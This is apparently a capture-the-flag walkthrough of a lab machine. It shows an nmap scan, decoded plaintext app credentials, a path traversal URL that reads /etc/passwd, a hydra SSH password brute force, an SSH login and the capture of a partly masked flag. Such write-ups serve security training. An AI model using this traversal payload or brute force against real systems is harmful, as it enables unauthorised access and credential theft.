### THM Include 

<img width="1115" height="802" alt="IncludeThm" src="https://github.com/user-attachments/assets/69fa2c50-3fd5-402b-89f6-3af8c582c4dd" />


````bash
nmap -sC -sV 10.201.57.150
Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-03 21:36 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.201.57.150
Host is up (0.0042s latency).
Not shown: 992 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: mail.filepath.lab, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
|_ssl-date: TLS randomness does not represent time
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE PIPELINING UIDL TOP STLS CAPA SASL RESP-CODES
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: more have ID STARTTLS post-login LOGINDISABLEDA0001 IDLE IMAP4rev1 LITERAL+ capabilities LOGIN-REFERRALS SASL-IR ENABLE Pre-login OK listed
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: more AUTH=PLAIN ID have post-login IDLE capabilities IMAP4rev1 LITERAL+ Pre-login LOGIN-REFERRALS SASL-IR ENABLE OK AUTH=LOGINA0001 listed
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE PIPELINING UIDL TOP USER CAPA SASL(PLAIN LOGIN) RESP-CODES
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Not valid before: 2021-11-10T16:53:34
|_Not valid after:  2031-11-08T16:53:34
4000/tcp  open  http     Node.js (Express middleware)
|_http-title: Sign In
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: System Monitoring Portal
MAC Address: 16:FF:C4:7B:13:F3 (Unknown)
Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.79 seconds
````


<img width="1418" height="930" alt="image" src="https://github.com/user-attachments/assets/c9fbe5e4-4e4e-4126-9e6a-c772195f5c80" />



<img width="1091" height="266" alt="image" src="https://github.com/user-attachments/assets/e933baa2-9232-4b57-8b28-2b25ba73177e" />



<img width="1411" height="1012" alt="add details" src="https://github.com/user-attachments/assets/a40fccbd-524f-498d-96f0-4b8cec3c0d1e" />

```bash
root@ip-10-201-98-84:~# echo "eyJSZXZpZXdBcHBVc2eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=" | base64 --decode
{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}
```
---

<img width="908" height="297" alt="image" src="https://github.com/user-attachments/assets/5b682101-b907-460d-afc3-31eb9cac0b4e" />


---

`http://10.201.57.150:50000/profile.php?img=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd`

<img width="1424" height="392" alt="image" src="https://github.com/user-attachments/assets/015cbabc-19ac-4e3c-8e66-7ea5164bb718" />

---

```bash
hydra -l joshua -P /usr/share/wordlists/fasttrack.txt 10.201.57.150 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-03 21:59:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking ssh://10.201.57.150:22/
[STATUS] 143.00 tries/min, 143 tries in 00:01h, 83 to do in 00:01h, 16 active
[22][ssh] host: 10.201.57.150   login: joshua   password: 1*****
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-03 22:01:25
root@ip-10-201-98-84:~# ssh joshua@10.201.57.150
```




````bash
ssh joshua@10.201.57.150
The authenticity of host '10.201.57.150 (10.201.57.150)' can't be established.
ECDSA key fingerprint is SHA256:n/CJSTyO/fCeA0OyTt3CFwX50PajXIcobCwIF4i4czQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.201.57.150' (ECDSA) to the list of known hosts.
joshua@10.201.57.150's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.15.0-1055-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Nov  3 22:01:40 UTC 2025

  System load:  0.12              Processes:             142
  Usage of /:   8.3% of 58.09GB   Users logged in:       0
  Memory usage: 19%               IPv4 address for eth0: 10.201.57.150
  Swap usage:   0%

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

98 updates can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

1 updates could not be installed automatically. For more details,
see /var/log/unattended-upgrades/unattended-upgrades.log

joshua@filepath:~$ ls
````

````bash
joshua@filepath:~/Maildir$ cd  /var/www/html
joshua@filepath:/var/www/html$ ls
505eb0fb8a9f32853b4d955e1f9123ea.txt  dashboard.php  logout.php   uploads
api.php                               index.php      profile.php
auth.php                              login.php      templates
joshua@filepath:/var/www/html$ cat 505eb0fb8a9f32853b4d955e1f9123ea.txt 
THM{505eb0fb************955e1f9123ea}
joshua@filepath:/var/www/html$ 
````

